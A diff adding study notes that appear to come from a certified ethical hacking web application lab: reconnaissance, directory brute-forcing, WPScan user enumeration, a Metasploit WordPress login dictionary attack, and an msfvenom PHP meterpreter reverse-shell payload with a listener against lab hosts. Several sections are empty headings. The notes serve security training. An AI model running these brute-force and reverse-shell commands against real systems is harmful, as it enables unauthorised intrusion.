@@ -1,0 +1,127 @@
+Objective
+The objective of the lab is to perform web application hacking and other tasks that include, but are not limited to:
+
+	• Footprinting a web application using various information-gathering tools
+	• Performing web spidering, detect load balancers, and identify web server directories
+	• Performing web application vulnerability scanning
+	• Performing brute-force and cross-site request forgery (CSRF) attack
+	• Exploiting parameter tampering and cross-site scripting (XSS) vulnerabilities
+	• Exploiting WordPress plugin vulnerabilities
+	• Exploiting remote command execution vulnerability
+	• Exploiting file upload vulnerability
+	• Gaining backdoor access via a web shell
+	• Detecting web application vulnerabilities using various web application security tools
+
+Ethical hackers or pen testers use numerous tools and techniques to perform web application attacks on the target web application. Recommended labs that will assist you in learning various web application attack techniques include:
+
+Footprint the web infrastructure
+
+	• Perform web application reconnaissance using Nmap and Telnet
+	• Perform web application reconnaissance using WhatWeb
+	• Perform web spidering using OWASP ZAP
+	• Detect load balancers using various tools
+	• Identify web server directories using various tools
+	• Perform web application vulnerability scanning using Vega
+	• Identify clickjacking vulnerability using ClickjackPoc
+	• Perform web application attacks
+
+	• Perform a brute-force attack using Burp Suite
+	• Perform parameter tampering using Burp Suite
+	• Identify XSS vulnerabilities in web applications using PwnXSS
+	• Exploit parameter tampering and XSS vulnerabilities in web applications
+	• Perform cross-site request forgery (CSRF) attack
+	• Enumerate and hack a web application using WPScan and Metasploit
+	• Exploit a remote command execution vulnerability to compromise a target web server
+	• Exploit a file upload vulnerability at different security levels
+	• Gain access by exploiting Log4j vulnerability
+	
+---------------
+Perform Web Application Reconnaissance using Nmap and Telnet
+
+	•  nmap -T4 -A -v [Target Web Application]  =>  -T4: specifies setting time template (0-5), -A: specifies aggressive scan, and -v: enables the verbose output (include all hosts and ports in the output).
+
+	• telnet www.moviescope.com 80
+	• GET / HTTP/1.0
+	• server is identified as Microsoft-IIS/10.0 and the technology used is ASP.NET.
+
+
+Perform Web Application Reconnaissance using WhatWeb
+
+	• whatweb -v [Target Web Application]
+	• whatweb --log-verbose=MovieScope_Report www.moviescope.com and press Enter to export the results returned by WhatWeb as a text file.
+
+Perform Web Spidering using OWASP ZAP
+
+Detect Load Balancers using Various Tools
+	• dig yahoo.com
+	• lbd yahoo.com
+	• lbd (load balancing detector) detects if a given domain uses DNS and http load balancing via the Server: and Date: headers and the differences between server answers. It analyzes the data received from application responses to detect load balancers.
+
+Identify Web Server Directories using Various Tools
+
+	• nmap -sV --script=http-enum [target domain or IP address] 
+
+	• gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt,  => dir: uses the directory or file brute-forcing mode, -u: specifies the target URL (here, www.moviescope.com), and -w: specifies the wordlist file used for directory brute-forcing (here, common.txt).
+
+	•  python3 dirsearch.py -u http://www.moviescope.com
+
+	• python3 dirsearch.py -u http://www.moviescope.com -e aspx  => -u: specifies URL and –e: specifies extension of the file
+
+	• python3 dirsearch.py -u http://www.moviescope.com -x 403
+
+Perform Web Application Vulnerability Scanning using Vega  (Application on windows machine)
+
+Identify Clickjacking Vulnerability using ClickjackPoc
+	•  python3 clickJackPoc.py -f domain.txt  => -f: specifies the file which contains domain names.
+
+Identify XSS Vulnerabilities in Web Applications using PwnXSS
+
+python3 pwnxss.py -u http://testphp.vulnweb.com
+
+Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications
+
+
+wpscan --api-token [API Token from Step#26] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp and press Enter.
+--enumerate vp: specifies the enumeration of vulnerable plugins.
+
+
+Enumerate and Hack a Web Application using WPScan and Metasploit
+wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u 
+	--enumerate u: specifies the enumeration of usernames.
+
+Type msfconsole and press Enter to launch the Metasploit framework.
+In msfconsole, type use auxiliary/scanner/http/wordpress_login_enum and press Enter.
+
+	• PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack
+	• RHOST: Sets the target machine (here, the Windows Server 2022 IP address)
+	• RPORT: Sets the target machine port (here, the Windows Server 2022 port)
+	• TARGETURI: Sets the base path to the WordPress website (here, http://[IP Address of Windows Server 2022]:8080/CEH]
+	• USERNAME: Sets the username that was obtained in Step 8. (here, admin)
+
+	• set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt
+	• set RHOSTS [IP Address of Windows Server 2022] (here, 10.10.1.22) 
+	• set RPORT 8080
+	• set TARGETURI http://[IP Address of Windows Server 2022]:8080/CEH
+	•  set USERNAME admin
+	• Run
+
+
+Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server
+
+
+
+Exploit a File Upload Vulnerability at Different Security Levels
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw 
+msfconsole
+use exploit/multi/handler 
+Type set payload php/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.1.13 and press Enter
+Type set LPORT 4444 and press Enter
+Type run and press Enter to start the listener
+Meterpreter session 1 opened
+
+sysinfo 
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw 
+
